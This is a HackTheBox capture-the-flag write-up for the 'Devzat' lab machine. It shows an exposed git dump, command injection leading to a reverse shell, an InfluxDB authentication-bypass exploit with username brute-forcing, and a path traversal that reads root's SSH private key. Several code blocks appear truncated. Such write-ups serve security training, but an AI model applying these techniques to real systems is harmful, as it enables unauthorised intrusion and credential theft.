Devzat is a medium rated machine on HackTheBox created by [c1sc0](https://www.hackthebox.eu/home/users/profile/34604). For the user part we will discover a command injection vulnerability by downloading an exposed git directory on a vhost. On the machine there is a vulnerable installation of InfluxDB running which enables us to retrieve the password for another user. For the root part we will find a password in the backups folder for a devzat application which allows us to read root's private ssh key.

# User

## Nmap

As usual we start our enumeration with a nmap scan against all ports followed by a script and version detection scan against the open ones to get an overview of the initial attack surface.

`All ports`
```
$ sudo nmap -p- -T4 10.129.95.249
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-16 20:08 UTC

`Script and version`
```

## Exposed git

Port 80 and 8000 seem the most promising initially. On port 80 we see a homepage for the devzat application.

[![005_devzat_home](/img/devzat/005_devzat_home.png)](/img/devzat/005_devzat_home.png)

Fuzzing for vhosts on the machine we discover a `pets` vhost which we add to our `/etc/hosts` file.

Opening the page in our browser we find a custom looking application where we can add pets to a list.

[![010_pet_home](/img/devzat/010_pet_home.png)](/img/devzat/010_pet_home.png)

Fuzzing for directories on the webpage we find that the `.git` directory is exposed.

We can quickly dump this using `git-dumper`.

```
$ git-dumper http://pets.devzat.htb/.git dump

```

## Command injection

The `loadCharacter` function in `main.go` looks interesting as it seems to be vulnerable to command injection by directly passing user controlled input to `sh -c`.

`main.go`
```go
...[snip]...
func loadCharacter(species string) string {
	cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
	stdoutStderr, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(stdoutStderr)
}
...[snip]...
```

This function get's called when we add a new pet to the list, so let's intercept the request for it in burp and send it to repeater. Next we set up a ncat listener to catch the reverse shell.

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

The vulnerable parameter is the `species` parameter so we inject our bash reverse shell there, terminating before and after it with `;`, and send the request.

[![015_add_pet](/img/devzat/015_add_pet.png)](/img/devzat/015_add_pet.png)

This results in a reverse shell on our listener as patrick which we upgrade and fix the terminal size.

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575

Looking around in patrick's home directory we find his private ssh key.

## InfluxDB

Connecting to the earlier found ssh port 8000 as patrick we see an interesting discussion between him and admin where a influxdb instance is mentioned.

```
patrick@devzat:~/pets$ ssh 127.0.0.1 -p 8000
admin: Hey patrick, you there?
patrick: Sure, shoot boss!
admin: So I setup the influxdb for you as we discussed earlier in business meeting.
patrick: Cool 👍
admin: Be sure to check it out and see if it works for you, will ya?
patrick: Yes, sure. Am on it!
devbot: admin has left the chat
Welcome to the chat. There are no more users
devbot: patrick has joined the chat
patrick:
```

Checking for open ports on the machine we see it seems to be listening on localhost on its default port.

```
patrick@devzat:~/pets$ ss -ln
...[snip]...
tcp		LISTEN		0		4096		127.0.0.1:8086		0.0.0.0:*
...[snip]...
```

Doing a HEAD request on it we can identify the version to be `1.7.5` for which a known CVE exists.

```
patrick@devzat:~$ curl -I http://127.0.0.1:8086
HTTP/1.1 404 Not Found
Content-Type: text/plain; charset=utf-8

```

To use [this](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933) PoC on it we forward it to our machine with chisel.

```
$ chisel server -p 9000 -reverse

```

After we modify the exploit script to remove the unessecary request for the banner we create a small list of known possible usernames.

`__main__.py`
```py
...[snip]...
if __name__ == '__main__':

    exploit()
```

`users`
```
patrick
catherine
admin
root
```

Running the exploit we see that is indeed vulnerable to an empty SharedSecret and we are able to access the database as the admin user.

```
$ python __main__.py

Insert ip host (default localhost):
Insert port (default 8086):
Insert influxdb user (wordlist path to bruteforce username): ../users

Start username bruteforce
[x] patrick
[x] catherine
[v] admin

Host vulnerable !!!
Databases list:

1) devzat
2) _internal

Insert database name (exit to close):
```

We select the `devzat` database and a query for existing tables results in a `user` table.

```
Insert database name (exit to close): devzat
[devzat] Insert query (exit to change db): SHOW MEASUREMENTS
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "name"
                    ],
                    "name": "measurements",
                    "values": [
                        [
                            "user"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

Next we enumerate the columns for the table.

```
[devzat] Insert query (exit to change db): SHOW FIELD KEYS
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "fieldKey",
                        "fieldType"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "enabled",
                            "boolean"
                        ],
                        [
                            "password",
                            "string"
                        ],
                        [
                            "username",
                            "string"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```

Username and password sound interesting so we retrieve the values for them.

```
[devzat] Insert query (exit to change db): SELECT "username", "password" FROM "user"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "username",
                        "password"
                    ],
                    "name": "user",
                    "values": [

}
```

The only user that actually exists on the machine is catherine. Password authentication is disabled for ssh so we set the correct permissions on the earlier found ssh key for patrick, ssh into the machine and switch to catherine. Now we can add the user flag to our collection.

```
$ chmod 600 patrick
$ ssh -i patrick patrick@devzat.htb

# Root

## Backup

Checking in to devzat as catherine we see another interesting conversation between her and patrick. They talk about a new feature in devzat being implemented on a local instance running on port 8443. Furthermore it is mentioned that the source code for the application is in the `backups` folder.

```
catherine@devzat:~$ ssh 127.0.0.1 -p 8000
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password I gave you last time.
catherine: k
patrick: I left the source for your review in backups.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. See ya!
devbot: patrick has left the chat
Welcome to the chat. There are no more users

Checking for it, it is indeed there and we are able to access it.

```
catherine@devzat:~$ ls /var/backups/
apt.extended_states.0  apt.extended_states.1.gz  apt.extended_states.2.gz  devzat-dev.zip  devzat-main.zip
```

A quick way to find differences in the `dev` variant is probably to just `diff` the two applications, so we transfer them both to our machine. We first copy them to the `/tmp` directory and allow all users to read them.

```
catherine@devzat:~$ cp /var/backups/devzat-dev.zip  /var/backups/devzat-main.zip /tmp/
catherine@devzat:~$ chmod 644 /tmp/devzat-main.zip /tmp/devzat-dev.zip
```

Now we can simply scp them to our machine using patricks ssh key.

```
$ scp -i patrick patrick@devzat.htb:/tmp/devzat-dev.zip .
devzat-dev.zip                                                                                                                                                                                            100%   28KB 339.4KB/s   00:00
$ scp -i patrick patrick@devzat.htb:/tmp/devzat-main.zip .

```

After we unzipped both repositories we run a diff on the folders. The newly implemented function seems to be `fileCommand`. It takes two arguments where the second one is the password and the first one the file to read.

```
$ diff dev main
...[snip]...
< func fileCommand(u *user, args []string) {
<       if len(args) < 1 {
<               u.system("Please provide file to print and the password")
<               return
<       }
<
<       if len(args) < 2 {
<               u.system("You need to provide the correct password to use this function")
<               return
<       }
<
<       path := args[0]
<       pass := args[1]
<
<       // Check my secure password
<       if pass != "CeilingCatStillAThingIn2021?" {
<               u.system("You did provide the wrong password")
<               return
<       }
...[snip]...
```

Checking how the command is registered we can see that it is implemented as `/file`.

`commands.go`
```
...[snip]...
func registerCommands() {
	var (
		clear       = commandInfo{"clear", "Clears your terminal", clearCommand, 1, false, nil}
		message     = commandInfo{"message", "Sends a private message to someone", messageCommand, 1, false, []string{"msg", "="}}
		users       = commandInfo{"users", "Gets a list of the active users", usersCommand, 1, false, nil}
		all         = commandInfo{"all", "Gets a list of all users who has ever connected", allCommand, 1, false, nil}
		exit        = commandInfo{"exit", "Kicks you out of the chat incase your client was bugged", exitCommand, 1, false, nil}
		bell        = commandInfo{"bell", "Toggles notifications when you get pinged", bellCommand, 1, false, nil}
		room        = commandInfo{"room", "Changes which room you are currently in", roomCommand, 1, false, nil}
		kick        = commandInfo{"kick", "Kicks a user", kickCommand, 2, true, nil}
		id          = commandInfo{"id", "Gets the hashed IP of the user", idCommand, 1, false, nil}
		_commands   = commandInfo{"commands", "Get a list of commands", commandsCommand, 1, false, []string{"commands"}}
		nick        = commandInfo{"nick", "Change your display name", nickCommand, 1, false, nil}
		color       = commandInfo{"color", "Change your display name color", colorCommand, 1, false, nil}
		timezone    = commandInfo{"timezone", "Change how you view time", timezoneCommand, 1, false, []string{"tz"}}
		emojis      = commandInfo{"emojis", "Get a list of emojis you can use", emojisCommand, 1, false, nil}
		help        = commandInfo{"help", "Get generic info about the server", helpCommand, 1, false, nil}
		tictactoe   = commandInfo{"tictactoe", "Play tictactoe", tictactoeCommand, 1, false, []string{"ttt", "tic"}}
		hangman     = commandInfo{"hangman", "Play hangman", hangmanCommand, 0, false, []string{"hang"}}
		shrug       = commandInfo{"shrug", "Drops a shrug emoji", shrugCommand, 1, false, nil}
		asciiArt    = commandInfo{"ascii-art", "Bob ross with text", asciiArtCommand, 1, false, nil}
		exampleCode = commandInfo{"example-code", "Hello world!", exampleCodeCommand, 1, false, nil}
		file        = commandInfo{"file", "Paste a files content directly to chat [alpha]", fileCommand, 1, false, nil}
	)
	commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file}
}
...[snip]...
```

Connecting to the dev instance of devzat we try to read root's ssh key.

```
catherine@devzat:~$ ssh 127.0.0.1 -p 8443
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password which you can gather from the source. I left it in our default backups location.
catherine: k
patrick: I also put the main so you could diff main dev if you want.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. Consider it alpha state, though. Might not be secure yet. See ya!
devbot: patrick has left the chat

devbot: catherine has joined the chat
catherine: /file /root/.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/root/.ssh/id_rsa does not exist!
```

The error message tells us how the path get's concatenated, so we can simply go a directory up and are lucky to find root's private ssh key exists in the default location on the machine.

```
catherine: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?

[SYSTEM] -----END OPENSSH PRIVATE KEY-----
catherine:
```

All we have to do now is to clean the key, set the correct permissions on it, ssh into the machine as the root user and grab the flag.

```
$ chmod 600 root
$ ssh -i root root@devzat.htb
